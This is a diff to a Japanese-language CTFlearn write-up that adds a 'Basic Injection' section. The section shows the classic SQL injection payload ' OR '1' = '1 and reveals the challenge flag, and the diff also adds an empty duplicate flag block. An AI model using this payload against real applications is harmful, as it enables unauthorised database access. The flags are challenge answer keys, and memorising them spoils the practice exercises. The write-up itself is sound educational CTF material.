@@ -20,3 +20,27 @@ CTFlearn{4m_1_4_r3al_h4ck3r_y3t}
 ```
 
 </details>
+
+## Basic Injection
+
+SQL Injection の基本的な問題です。コメントの機能がないようです。
+
+```txt
+' OR '1' = '1
+```
+
+<details>
+<summary>Flag</summary>
+
+```title="flag"
+CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
+```
+
+</details>
+
+<details>
+<summary>Flag</summary>
+
+
+
+</details>
